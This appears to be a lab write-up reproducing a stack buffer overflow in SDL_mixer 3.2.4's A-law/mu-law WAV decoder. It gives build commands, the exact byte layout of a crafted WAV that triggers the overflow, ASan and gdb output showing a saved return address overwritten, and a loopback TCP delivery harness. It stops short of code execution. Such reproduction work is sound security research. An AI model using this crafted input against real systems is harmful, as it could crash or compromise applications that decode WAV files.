# Real SDL_mixer 3.2.4 build + real crafted WAV — file-path reachability of FetchXLaw()

Scope: W173/W179 follow-up for GHSA-7qqc-5rvj-wqqw / CVE-2026-122328.
New work only in `lab/frontier/sdlmixer2shell/deps/` and
`lab/frontier/sdlmixer2shell/harness/realwav/`. Evidence is under
`harness/realwav/evidence/`; `deps/` is gitignored and the new harness files
are untracked for parent integration. No reports/docs/walls/legacy harness
files were edited, nothing was committed.

## Bottom line

**File-path reachability is DEMONSTRATED.** A crafted A-law RIFF/WAVE file on
disk, loaded and decoded through the real SDL_mixer 3.2.4 public API, reaches
`FetchXLaw()` with `length=256`, `buflen=1024`, and produces
ASan `stack-buffer-overflow WRITE of size 4` at pinned
`src/decoder_wav.c:759` (`FetchALaw:771`, `WAV_decode:1668`,
`MIX_DecodeAudio:3190`). The same file through `MIX_LoadAudio`/`MIX_PlayTrack`
with SDL's `dummy` audio driver reaches the store on the audio thread via
`DecodeMore:306`. Fixed-source, 8-byte-data, PCM8 and bad-format controls are
clean. This is rungs 1–4 only: **no wire input, pointer/IP control or command
execution is claimed (NOT rung 5).**

## Provenance and hashes

| Artifact | Origin | SHA-256 |
|---|---|---|
| `deps/SDL_mixer-release-3.2.4.tar.gz` | <https://github.com/libsdl-org/SDL_mixer/archive/refs/tags/release-3.2.4.tar.gz> | `f2ea848ccdf2f394cd4973ee0f6c482e04511044695cccfd46bab6dcd7f780aa` |
| `deps/SDL3-release-3.4.0.tar.gz` | <https://github.com/libsdl-org/SDL/archive/refs/tags/release-3.4.0.tar.gz> | `9614b9696abc4597ffce6b888829dc6537ae500423474c342ac4a67222c5654c` |
| `deps/SDL3-release-3.2.4.tar.gz` (pre-existing lab SDL3) | tag `release-3.2.4` | `0fc1d23e225e2a098976571bf5d62b6d81e0ae84ff3d82a35a3d19ab04d07e5c` |
| tarball `src/decoder_wav.c` | `release-3.2.4` | `b651a6c2225378c6d2407df75eb1ec6f30ace68893a621cf29fd2089cd2016fa` (byte-identical to `src/decoder_wav.c.vuln` in `PINS.sha256`) |
| fixed decoder used in control build | pinned `src/decoder_wav.c.fixed` | `b930672ee9ceaaea46ed2e8a3251ea3207ebcfa7366e1e7c8e851e40d13d9ca3` |

`deps/SDL_mixer.sha256` and `deps/SDL3-3.4.0.sha256` record the two new
tarballs. Upstream GitHub does not publish a tarball checksum; verification is
by upstream tag object plus source identity:

- `release-3.2.4` (SDL_mixer) tag commit `72a81869b45e249e8e67102db4e98dd2441f05a1`
  via `curl -fsSL https://api.github.com/repos/libsdl-org/SDL_mixer/git/ref/tags/release-3.2.4`.
- `release-3.4.0` (SDL3) tag commit `a962f40bbba175e9716557a25d5d7965f134a3d3`
  via the analogous SDL API call.
- The extracted `release-3.2.4/src/decoder_wav.c` hash equals the previously
  pinned vulnerable raw file exactly, so the tarball used here is the same
  vulnerable source already under witness.

### Why SDL3 3.4.0 and not the lab's 3.2.4

The mixer tag declares `set(SDL_REQUIRED_VERSION 3.4.0)` at
`CMakeLists.txt:13`; SDL3 3.2.4 is below that and also lacks APIs the mixer
uses (`SDL_ALIGNED`, `SDL_PROP_AUDIOSTREAM_AUTO_CLEANUP_BOOLEAN`,
`SDL_PutAudioStreamDataNoCopy`). A temporary source-copy-only version edit was
first tried against the lab SDL3 3.2.4 build; it configured but the build
failed. Exact failing command and output are preserved in
`evidence/configure-vuln-asan-sdl3.2.4.log` and
`evidence/build-vuln-asan-sdl3.2.4-failed.log`; representative errors:

```
src/SDL_mixer_internal.h:140:23: error: expected parameter declarator
    140 |     float SDL_ALIGNED(16) position3d[4];
src/decoder_raw.c:96:9: error: call to undeclared function 'SDL_PutAudioStreamDataNoCopy'
src/SDL_mixer.c:850:66: error: use of undeclared identifier 'SDL_PROP_AUDIOSTREAM_AUTO_CLEANUP_BOOLEAN'
ninja: build stopped: subcommand failed.
```

The temporary `SDL_REQUIRED_VERSION` edit was reverted. Both final build
copies now have `CMakeLists.txt` byte-identical to upstream tarball
(SHA-256 `bc260a22779395f9978e25debed1b9fd709742a9c8335b497af0d66669b0472c`).
`deps/SDL_mixer-vuln-src/` is identical to the upstream tarball tree;
`deps/SDL_mixer-fixed-src/` differs only in `src/decoder_wav.c`, replaced with
the pinned fixed source. The fixed change is `float *out = (float *) buffer;`
instead of the vulnerable `float *out = (float *) &buffer[(length - 1) * 4];`.

## Exact fetch / build commands

Run from repo root. `$L=lab/frontier/sdlmixer2shell`, `$D=$(pwd)/$L/deps`.

```sh
# Fetch only; no external probing.
curl -fSL --retry 2 --connect-timeout 15 -o "$L/deps/SDL_mixer-release-3.2.4.tar.gz" \
  https://github.com/libsdl-org/SDL_mixer/archive/refs/tags/release-3.2.4.tar.gz
curl -fSL --retry 2 --connect-timeout 15 -o "$L/deps/SDL3-release-3.4.0.tar.gz" \
  https://github.com/libsdl-org/SDL/archive/refs/tags/release-3.4.0.tar.gz
sha256sum "$L/deps/SDL_mixer-release-3.2.4.tar.gz" "$L/deps/SDL3-release-3.4.0.tar.gz"
tar xzf "$L/deps/SDL_mixer-release-3.2.4.tar.gz" -C "$L/deps"
tar xzf "$L/deps/SDL3-release-3.4.0.tar.gz" -C "$L/deps"
cp -a "$L/deps/SDL_mixer-release-3.2.4" "$L/deps/SDL_mixer-vuln-src"
cp -a "$L/deps/SDL_mixer-release-3.2.4" "$L/deps/SDL_mixer-fixed-src"
cp "$L/src/decoder_wav.c.fixed" "$L/deps/SDL_mixer-fixed-src/src/decoder_wav.c"

# Headless SDL3 3.4.0, dummy audio driver enabled (SDL_DUMMYAUDIO=ON).
cmake -S "$L/deps/SDL-release-3.4.0" -B "$L/deps/SDL3-3.4.0-build" -G Ninja \
  -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=clang \
  -DSDL_UNIX_CONSOLE_BUILD=ON -DSDL_SHARED=ON -DSDL_STATIC=OFF \
  -DSDL_AUDIO=ON -DSDL_VIDEO=OFF -DSDL_RENDER=OFF -DSDL_X11=OFF \
  -DSDL_WAYLAND=OFF -DSDL_JOYSTICK=OFF -DSDL_HAPTIC=OFF -DSDL_TESTS=OFF
cmake --build "$L/deps/SDL3-3.4.0-build"
```

Configure lines for vulnerable/fixed/nossp mixer builds are identical except
source/build directories and `CMAKE_C_FLAGS`; the exact vulnerable-ASan form:

```sh
cmake -S "$D/SDL_mixer-vuln-src" -B "$D/mixer-vuln-asan-build" -G Ninja \
  -DCMAKE_C_COMPILER=clang -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS='-fsanitize=address -fno-omit-frame-pointer -g -O0' \
  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address' \
  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address' \
  -DSDL3_DIR="$D/SDL3-3.4.0-build" \
  -DBUILD_SHARED_LIBS=OFF -DSDLMIXER_VENDORED=OFF -DSDLMIXER_INSTALL=OFF \
  -DSDLMIXER_TESTS=OFF -DSDLMIXER_EXAMPLES=OFF -DSDLMIXER_WERROR=OFF \
  -DSDLMIXER_WAVE=ON -DSDLMIXER_AIFF=OFF -DSDLMIXER_VOC=OFF -DSDLMIXER_AU=OFF \
  -DSDLMIXER_FLAC=OFF -DSDLMIXER_GME=OFF -DSDLMIXER_MOD=OFF -DSDLMIXER_MP3=OFF \
  -DSDLMIXER_MIDI=OFF -DSDLMIXER_OPUS=OFF -DSDLMIXER_VORBIS_STB=OFF \
  -DSDLMIXER_VORBIS_VORBISFILE=OFF -DSDLMIXER_WAVPACK=OFF
cmake --build "$D/mixer-vuln-asan-build"
```

Fixed build: same command with `SDL_mixer-vuln-src` → `SDL_mixer-fixed-src`
and `mixer-vuln-asan-build` → `mixer-fixed-asan-build`. No-stack-protector
build: `SDL_mixer-vuln-src` → `mixer-vuln-nossp-build` with
`-DCMAKE_C_FLAGS='-fno-stack-protector -g -O0'` and no sanitizer linker flags.
All three builds succeeded (`build rc=0`); tee'd output:
`evidence/configure-vuln-asan.log`, `evidence/build-vuln-asan.log`,
`evidence/configure-fixed-asan.log`, `evidence/build-fixed-asan.log`,
`evidence/configure-vuln-nossp.log`, `evidence/build-vuln-nossp.log`,
`evidence/configure-sdl3-3.4.0.log`, `evidence/build-sdl3-3.4.0.log`.

Driver (`harness/realwav/realwav_driver.c`) is linked against the real static
`libSDL3_mixer.a` and the real shared `libSDL3.so` from the 3.4.0 build:

```sh
clang -g -O0 -fno-omit-frame-pointer -fsanitize=address \
  -I"$D/SDL_mixer-vuln-src/include" -I"$D/SDL-release-3.4.0/include" \
  -I"$D/SDL3-3.4.0-build/include-revision" \
  "$L/harness/realwav/realwav_driver.c" "$D/mixer-vuln-asan-build/libSDL3_mixer.a" \
  -L"$D/SDL3-3.4.0-build" -lSDL3 -Wl,-rpath,"$D/SDL3-3.4.0-build" \
  -lm -lpthread -ldl -o "$L/harness/realwav/evidence/realwav-driver-vuln-asan"
```

Fixed driver uses `SDL_mixer-fixed-src/include` and
`mixer-fixed-asan-build/libSDL3_mixer.a`; nossp driver drops `-fsanitize=address`
and links `mixer-vuln-nossp-build/libSDL3_mixer.a`. Driver SHA-256:
vuln ASan `01279a4ee9ba7ad37c1447e0f537136c46b1c62d9c0ef81067bd0368f06f9b3e`,
fixed ASan `46c864eeb0f5ed9bd515ea585e451f8b8e8cf1a9b5f6d84531443013a7b8201c`.

Scenarios were run from `harness/realwav/evidence` with:

```sh
export ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-18/bin/llvm-symbolizer
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
./realwav-driver-vuln-asan alaw256.wav decode   # and ulaw256/alaw8/pcm8_256/badfmt_256
./realwav-driver-vuln-asan alaw256.wav play
./realwav-driver-fixed-asan alaw256.wav decode  # etc.
./realwav-driver-fixed-asan alaw256.wav play
```

The driver calls `SDL_SetHint(SDL_HINT_AUDIO_DRIVER, "dummy")` before
`SDL_Init(SDL_INIT_AUDIO)`, then `MIX_Init()`. `decode` mode calls
`MIX_CreateAudioDecoder(path, 0)`, `MIX_GetAudioDecoderFormat`, and
`MIX_DecodeAudio` on the main thread. `play` mode calls
`MIX_CreateMixerDevice(SDL_AUDIO_DEVICE_DEFAULT_PLAYBACK, NULL)`,
`MIX_LoadAudio(mixer, path, false)`, `MIX_CreateTrack`, `MIX_SetTrackAudio`,
`MIX_PlayTrack`, and `SDL_Delay(300)`. Every run reported
`AUDIO_DRIVER=dummy MIX_DECODERS=3`.

## WAV byte layout

`craft_wav.py evidence` generates the files; `evidence/wav-generation.log`
records sizes and hashes. Minimal RIFF layout (`alaw256.wav`, 300 bytes,
SHA-256 `b180dc1e14ad783dec2f62e403359b8614b9b94a1365b32a23d9f65de56173bb`):

```
offset  bytes            meaning
0x00    52 49 46 46      "RIFF"
0x04    24 01 00 00      RIFF size 0x124 = 36 + 256
0x08    57 41 56 45      "WAVE"
0x0c    66 6d 74 20      "fmt "
0x10    10 00 00 00      fmt chunk length 16
0x14    06 00            WAVE_FORMAT_ALAW (6; 7 = mu-law, 1 = PCM)
0x16    01 00            mono
0x18    40 1f 00 00      8000 Hz
0x1c    40 1f 00 00      byte rate 8000
0x20    01 00            block align 1
0x22    08 00            8 bits/sample
0x24    64 61 74 61      "data"
0x28    00 01 00 00      data chunk length 0x100 = 256
0x2c    256 bytes        payload = (0x55 + (i & 0x3f)) & 0xff
```

`ParseFMT` maps tag 6→`FetchALaw`, tag 7→`FetchULaw`, requires bits=8 for
x-law, and sets `spec.format=SDL_AUDIO_F32`; `adata->framesize=1` and
`decoded_framesize=4`. `WAV_decode` then computes
`available_bytes=256*4=1024`, `buflen=min(1024,1024)=1024`, and `FetchXLaw`
reads `1024/4=256` bytes. Hence `out=&buffer[1020]`, and the loop stores
`out[255..0]`, touching bytes `buffer[2040..2043]` down to `buffer[0..3]`:
1020 bytes past the 1024-byte caller buffer.

| File | fmt tag | data bytes | SHA-256 |
|---|---|---|---|
| `alaw256.wav` | 6 | 256 | `b180dc1e14ad783dec2f62e403359b8614b9b94a1365b32a23d9f65de56173bb` |
| `ulaw256.wav` | 7 | 256 | `e8a2af618e3888f494886007921a1f25bc78ef220c127a7430dd33241f99a966` |
| `alaw8.wav` | 6 | 8 | `f7ade48bf269ae88a9bda1e69bea1f42dcfe32f6bcb0720678f724d1b572a158` |
| `pcm8_256.wav` | 1 | 256 | `251e07868a875209e6321385d0b0cea6ed5ede4e7e8dba90e4905d794ecbbf0c` |
| `badfmt_256.wav` | 0x1234 | 256 | `03764bdbdaba43aa9fca9071213645a83e1de93dd10b97e3e63e761c665db658` |

## Results (exact logs in `harness/realwav/evidence/`)

| Scenario | Build / API path | Result | Evidence (rc file beside each `.out`) |
|---|---|---|---|
| `alaw256`, decode | vuln ASan / decoder API | **ASan FAIL (expected)**: `WRITE of size 4`, rc=1 | `asan-vuln-decode-alaw256.out` |
| `ulaw256`, decode | vuln ASan / decoder API | **ASan FAIL (expected)**: same overflow via `FetchULaw:766`, rc=1 | `asan-vuln-decode-ulaw256.out` |
| `alaw256`, play | vuln ASan / mixer+dummy device | **ASan FAIL (expected)**: same overflow on audio thread, rc=1 | `asan-vuln-play-alaw256.out` |
| `alaw8`, decode | vuln ASan | clean, rc=0, `DECODE got=32`, total=32 | `asan-vuln-decode-alaw8.out` |
| `pcm8_256`, decode | vuln ASan | clean, rc=0, `DECODE got=256` (sibling `FetchPCM`) | `asan-vuln-decode-pcm8_256.out` |
| `badfmt_256`, decode | vuln ASan | expected reject, rc=1, `RESULT=LOAD_ERROR ERROR=Audio data is in unknown/unsupported/corrupt format` | `asan-vuln-decode-badfmt_256.out` |
| all 5 decode + play | fixed ASan | clean: `alaw256`/`ulaw256` `got=1024`, total=1024, rc=0; safe/pcm/badfmt as above; play rc=0 | `asan-fixed-decode-*.out`, `asan-fixed-play-alaw256.out` |

Play mode was also run for all five WAVs in both trees: `asan-vuln-play-ulaw256.out`
reports the same `:759` overflow; `asan-vuln-play-alaw8.out`,
`asan-vuln-play-pcm8_256.out`, `asan-vuln-play-badfmt_256.out`, and all
`asan-fixed-play-*.out` are clean (bad-format rejects are expected, rc=1).

Top frames, vulnerable A-law decoder API (`asan-vuln-decode-alaw256.out`,
verbatim):

```
MODE=decode PATH=alaw256.wav AUDIO_DRIVER=dummy MIX_DECODERS=3
SPEC freq=8000 format=33056 channels=1 framesize=4
ERROR: AddressSanitizer: stack-buffer-overflow
WRITE of size 4
    #0 FetchXLaw  .../deps/SDL_mixer-vuln-src/src/decoder_wav.c:759:16
    #1 FetchALaw  .../deps/SDL_mixer-vuln-src/src/decoder_wav.c:771:12
    #2 WAV_decode .../deps/SDL_mixer-vuln-src/src/decoder_wav.c:1668:20
    #3 MIX_DecodeAudio .../deps/SDL_mixer-vuln-src/src/SDL_mixer.c:3190:14
    #4 main .../harness/realwav/realwav_driver.c:60:23
Address ... is located in stack of thread T0 at offset 1180 in frame
    #0 WAV_decode .../src/decoder_wav.c:1601
  This frame has 1 object(s):
    [32, 1056) 'buffer' (line 1658) <== Memory access at offset 1180 overflows this variable
SUMMARY: AddressSanitizer: stack-buffer-overflow .../src/decoder_wav.c:759:16 in FetchXLaw
```

The loop's first store is at `buffer+2040`; ASan detects it when the descending
writes reach its redzone at `buffer+1148` (frame offset 1180). Mu-law differs
only at frame `#1 FetchULaw ...:766`. Through `MIX_PlayTrack`
(`asan-vuln-play-alaw256.out`) frames are `#0 FetchXLaw:759`,
`#1 FetchALaw:771`, `#2 WAV_decode:1668`, `#3 DecodeMore .../SDL_mixer.c:306`,
`#4 TrackGetCallback .../SDL_mixer.c:381`, on the SDL audio thread.

## gdb: adjacent object at the real frame

`gdb-realwav.cmd` runs `realwav-driver-vuln-nossp` (no ASan, no stack
protector) and stops at `decoder_wav.c:759` for `i==255` (first OOB store) and
`i==1`. Full transcript: `evidence/gdb-realwav-nossp-i1.out`.

- Entry: `length=256`, `buffer=0x7fffffffdb70`, `out=0x7fffffffdf6c`
  (`buffer+1020`).
- First store `i=255`: `buffer[255]=148` (0x94 from the file),
  `lut[148]` bits `0x3d8c0118`; destination `buffer+2040` held
  `a9 eb ff ff ff 7f 00 00` before the store. At this point the caller frame
  is intact: `WAV_decode` frame at `0x7fffffffdfe0`, saved RBP
  `0x7fffffffdfd0`, saved RIP `0x7fffffffdfd8` = `0x0000555555560a60`.
- Stop `i=1`: `buffer[1]=86` (0x56), `lut[86]` bits `0xbae001c0`.
  `buffer+1020..1027 = 00 00 00 00 00 04 00 00` (the bytes at `+1024` were
  written by the preceding `i=2` iteration).
  `buffer+1128 = 58 01 ac bc`, i.e. the saved RIP slot now reads
  `0xbca40148bcac0158`; `bt` frame `#3` and `info frame` both show that value,
  and `WAV_decode` locals (`tdata`, `seekblock`, `decoded_framesize`,
  `available_bytes`) are garbage.

**Adjacent object:** in the real no-SSP frame the 1020-byte store covers
`WAV_decode`'s own stack frame past its 1024-byte `buffer`: the frame's saved
RBP (`buffer+1120`) and saved RIP (`buffer+1128`), its locals, and onward into
the caller's frame. In the ASan build the adjacent region is the 32-byte stack
right redzone of `buffer` (`f3` shadow), which is where the report fires.
The overwriting value is a float bit pattern from `MIX_alawToFloat`, not a
chosen pointer or instruction address: this is control-flow-corruption
*prima facie* corrupted state, **not** demonstrated control of RIP or code
execution.

## Ceiling

Demonstrated: real SDL_mixer 3.2.4 build, real on-disk RIFF/WAVE input, real
SDL_mixer public API, real SDL3 dummy audio device, pinned vulnerable line
reached with attacker-controlled length, ASan `WRITE of size 4`, clean fixed
and negative controls, and gdb observation of the adjacent saved-frame bytes.
Not demonstrated and not claimed at this scope: chosen pointer values,
instruction-pointer control, or command execution (rung 5). The W181
loopback-wire extension below adds wire input without any of those.

## Loopback-wire input (W181, 2026-11-23)

Scope extension only: the WAV bytes now arrive on a 127.0.0.1 TCP socket
instead of from a file path. `wire_driver.c` binds `INADDR_LOOPBACK`, accepts
one connection, reads up to 4096 bytes into a static buffer, wraps them with
`SDL_IOFromMem`, and passes that stream to the real
`MIX_CreateAudioDecoder_IO(io, true, 0)` / `MIX_DecodeAudio` API (`decode`)
or `MIX_LoadAudio_IO(mixer, io, false, true)` / `MIX_PlayTrack` (`play`).
No file path, no external address, no SDL or mixer source changes. It is
linked against the same committed vulnerable/fixed static mixer builds:

```sh
clang -g -O0 -fno-omit-frame-pointer -fsanitize=address \
  -I"$D/SDL_mixer-vuln-src/include" -I"$D/SDL-release-3.4.0/include" \
  -I"$D/SDL3-3.4.0-build/include-revision" \
  "$L/harness/realwav/wire_driver.c" "$D/mixer-vuln-asan-build/libSDL3_mixer.a" \
  -L"$D/SDL3-3.4.0-build" -lSDL3 -Wl,-rpath,"$D/SDL3-3.4.0-build" \
  -lm -lpthread -ldl -o "$L/harness/realwav/evidence/wire-driver-vuln-asan"
```

Fixed driver: same command with `SDL_mixer-fixed-src/include` and
`mixer-fixed-asan-build/libSDL3_mixer.a`, output `wire-driver-fixed-asan`.
Each scenario starts the listener in the background, then sends the committed
WAV from a Python client:

```sh
export ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-18/bin/llvm-symbolizer
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
E=lab/frontier/sdlmixer2shell/harness/realwav/evidence
"$E/wire-driver-vuln-asan" 19442 decode >"$E/wire-vuln-decode-alaw256.out" 2>&1 &
python3 -c 'import socket,sys; s=socket.create_connection(("127.0.0.1",int(sys.argv[1])),2); s.sendall(open(sys.argv[2],"rb").read()); s.shutdown(socket.SHUT_WR); s.close()' 19442 "$E/alaw256.wav"
```

| Output prefix | Build / mode | Wire bytes | Result |
|---|---|---|---|
| `wire-vuln-decode-alaw256.out` | vuln ASan / decode | 300 | rc=1, ASan `WRITE of size 4` at `:759` via `FetchALaw:771` → `WAV_decode:1668` → `MIX_DecodeAudio:3190`, `buffer [32,1056)`, frame offset 1180 |
| `wire-vuln-decode-ulaw256.out` | vuln ASan / decode | 300 | rc=1, same via `FetchULaw:766` |
| `wire-vuln-play-alaw256.out` | vuln ASan / play | 300 | rc=1, same store on audio thread via `DecodeMore:306` → `TrackGetCallback:381` |
| `wire-fixed-decode-alaw256.out` | fixed ASan / decode | 300 | rc=0, `got=1024`, clean |
| `wire-fixed-play-alaw256.out` | fixed ASan / play | 300 | rc=0, `PLAY started=1`, clean |
| `wire-vuln-decode-alaw8.out` | vuln ASan / decode | 52 | rc=0, `got=32`, clean |
| `wire-vuln-decode-badfmt.out` | vuln ASan / decode | 300 | rc=1, parser rejection, no ASan report |

All seven runs printed `LISTEN=127.0.0.1:<port>` and `WIRE bytes=...
first4=52494646` ("RIFF"). The listener is the lab driver: this demonstrates
attacker-supplied bytes on a loopback wire reaching the pinned store through
real mixer APIs, **not** an SDL_mixer network listener. No chosen pointer or
instruction address, no command, no side effect beyond the sanitizer report;
rungs 1-4 only, author-observed and unwitnessed.

Source, both built drivers and all seven output logs are checksummed in
`evidence/WIRE.sha256` (verify with `cd evidence && sha256sum -c WIRE.sha256`).
